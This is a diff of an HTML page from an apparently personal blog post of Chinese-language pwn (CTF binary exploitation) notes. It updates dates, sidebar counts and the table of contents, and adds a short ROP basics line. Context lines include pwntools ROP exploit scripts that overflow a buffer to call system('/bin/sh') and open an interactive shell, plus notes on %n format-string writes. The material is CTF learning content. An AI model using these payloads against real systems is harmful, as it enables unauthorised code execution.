@@ -88,7 +88,7 @@
 <meta property="og:description" content="零零散散总结了比较基础的pwn题知识点会持续更新є(･◇･｡)э">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://i.loli.net/2019/08/14/BIDV8X76iuTlbGe.png">
-<meta property="og:updated_time" content="2019-10-06T08:36:03.599Z">
+<meta property="og:updated_time" content="2019-10-14T04:57:35.498Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Pwn笔记">
 <meta name="twitter:description" content="零零散散总结了比较基础的pwn题知识点会持续更新є(･◇･｡)э">
@@ -302,8 +302,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-10-06T16:36:03+08:00">
-                2019-10-06
+              <time title="Post modified" itemprop="dateModified" datetime="2019-10-14T12:57:35+08:00">
+                2019-10-14
               </time>
             
           </span>
@@ -418,7 +418,8 @@
 <td>如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节</td>
 </tr>
 </tbody></table>
-<h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><h3 id="有system有bin-sh"><a href="#有system有bin-sh" class="headerlink" title="有system有bin/sh"></a>有system有bin/sh</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'0.0.0.0'</span>,<span class="number">12345</span>)</span><br><span class="line">system1 = <span class="number">0x08048320</span></span><br><span class="line">bin1 = <span class="number">0x0804A024</span></span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">0x8c</span>+ p32(system1) + p32(<span class="number">0</span>)+ p32(bin1)</span><br><span class="line"><span class="comment">#填充值/返回函数/函数结束地址/指向”/bin/sh“</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>将EIP劫持到某个函数的PLT表项中我们可以直接调用该函数</p>
+<h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><h3 id="有system有bin-sh"><a href="#有system有bin-sh" class="headerlink" title="有system有bin/sh"></a>有system有bin/sh</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'0.0.0.0'</span>,<span class="number">12345</span>)</span><br><span class="line">system1 = <span class="number">0x08048320</span></span><br><span class="line">bin1 = <span class="number">0x0804A024</span></span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">0x8c</span>+ p32(system1) + p32(<span class="number">0</span>)+ p32(bin1)</span><br><span class="line"><span class="comment">#填充值/返回函数/函数结束地址/指向”/bin/sh“</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <h3 id="有system无bin-sh"><a href="#有system无bin-sh" class="headerlink" title="有system无bin/sh"></a>有system无bin/sh</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'0.0.0.0'</span>,<span class="number">12345</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./名称'</span>)</span><br><span class="line">scanf_add = p32(elf.symbols[<span class="string">'__isoc99_scanf'</span>])</span><br><span class="line">format_s = p32(<span class="number">0x08045201</span>)</span><br><span class="line"><span class="comment">#%s地址</span></span><br><span class="line">binsh_add = p32(<span class="number">0x0804a030</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'A'</span>*<span class="number">0x34</span> + scanf_add + main_add + format_s + binsh_add</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br></pre></td></tr></table></figure>
 
@@ -564,7 +565,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -575,7 +576,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
@@ -586,7 +587,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-count">16</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
@@ -619,7 +620,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#基础知识"><span class="nav-number">1.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#checksec"><span class="nav-number">1.1.</span> <span class="nav-text">checksec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常用基本的格式化字符串参数介绍"><span class="nav-number">1.2.</span> <span class="nav-text">常用基本的格式化字符串参数介绍</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ROP"><span class="nav-number">2.</span> <span class="nav-text">ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#32位"><span class="nav-number">2.1.</span> <span class="nav-text">32位</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#有system有bin-sh"><span class="nav-number">2.1.1.</span> <span class="nav-text">有system有bin/sh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#有system无bin-sh"><span class="nav-number">2.1.2.</span> <span class="nav-text">有system无bin/sh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无system"><span class="nav-number">2.1.3.</span> <span class="nav-text">无system</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#64位"><span class="nav-number">2.2.</span> <span class="nav-text">64位</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#有sys无binsh有sh"><span class="nav-number">2.2.1.</span> <span class="nav-text">有sys无binsh有sh</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用ELF"><span class="nav-number">2.3.</span> <span class="nav-text">使用ELF</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#py"><span class="nav-number">3.</span> <span class="nav-text">py</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#汇编"><span class="nav-number">3.1.</span> <span class="nav-text">汇编</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#cyclic"><span class="nav-number">3.1.1.</span> <span class="nav-text">cyclic</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shellcode"><span class="nav-number">4.</span> <span class="nav-text">shellcode</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#基础知识"><span class="nav-number">1.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#checksec"><span class="nav-number">1.1.</span> <span class="nav-text">checksec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常用基本的格式化字符串参数介绍"><span class="nav-number">1.2.</span> <span class="nav-text">常用基本的格式化字符串参数介绍</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ROP"><span class="nav-number">2.</span> <span class="nav-text">ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基础"><span class="nav-number">2.1.</span> <span class="nav-text">基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#32位"><span class="nav-number">2.2.</span> <span class="nav-text">32位</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#有system有bin-sh"><span class="nav-number">2.2.1.</span> <span class="nav-text">有system有bin/sh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#有system无bin-sh"><span class="nav-number">2.2.2.</span> <span class="nav-text">有system无bin/sh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无system"><span class="nav-number">2.2.3.</span> <span class="nav-text">无system</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#64位"><span class="nav-number">2.3.</span> <span class="nav-text">64位</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#有sys无binsh有sh"><span class="nav-number">2.3.1.</span> <span class="nav-text">有sys无binsh有sh</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用ELF"><span class="nav-number">2.4.</span> <span class="nav-text">使用ELF</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#py"><span class="nav-number">3.</span> <span class="nav-text">py</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#汇编"><span class="nav-number">3.1.</span> <span class="nav-text">汇编</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#cyclic"><span class="nav-number">3.1.1.</span> <span class="nav-text">cyclic</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shellcode"><span class="nav-number">4.</span> <span class="nav-text">shellcode</span></a></li></ol></div>
             
 
           </div>
